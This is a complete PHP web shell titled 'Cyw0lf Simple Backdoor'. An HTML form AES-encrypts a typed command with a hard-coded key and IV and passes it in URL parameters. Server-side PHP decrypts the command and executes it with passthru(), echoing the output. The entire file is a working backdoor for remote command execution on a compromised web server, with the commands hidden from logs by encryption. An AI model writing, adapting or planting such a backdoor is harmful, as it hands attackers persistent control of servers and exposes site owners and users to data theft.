<!DOCTYPE html>
<html>
<head>
    <title>Cyw0lf Simple Backdoor</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.js"></script>
</head>
<body>
<form id="encryptionForm">
    Command: <input id="plaintext" rows="4" cols="50"></input>
    <button type="button" onclick="encrypt()">Execute</button>
</form>

<script>
    function encrypt() {
        const secretKey = CryptoJS.enc.Latin1.parse("17anHtr4ce1945".padEnd(32, '\0'));
        const iv = CryptoJS.enc.Latin1.parse("0123456789012345");
        const plaintext = document.getElementById('plaintext').value;
        const encrypted = CryptoJS.AES.encrypt(plaintext, secretKey, { iv: iv });
        const url = `?i=${encodeURIComponent(iv.toString())}&c=${encodeURIComponent(encrypted.toString())}`;
        window.location.href = window.location.pathname + url;
    }
    document.getElementById('plaintext').addEventListener('keydown', function(event) {
        if (event.key === 'Enter') {
            event.preventDefault(); // Prevent form submission
            encrypt(); // Call the encryption function
        }
    });
</script>

</body>
</html>
<pre>
<?php

if (isset($_GET['c']) && isset($_GET['i'])) {
    $secretKey = '17anHtr4ce1945';
    $ivHex = $_GET['i'];
    $encryptedMessage = $_GET['c'];

    $iv = hex2bin($ivHex);
    $decrypted = openssl_decrypt($encryptedMessage, 'aes-256-cbc', $secretKey, 0, $iv);
    $cmd = passthru($decrypted);
    if ($decrypted === false) {
        echo "Decryption failed: " . openssl_error_string() . "\n";
    } else {
        echo $cmd;
    }
    exit;
}

?>
</pre>
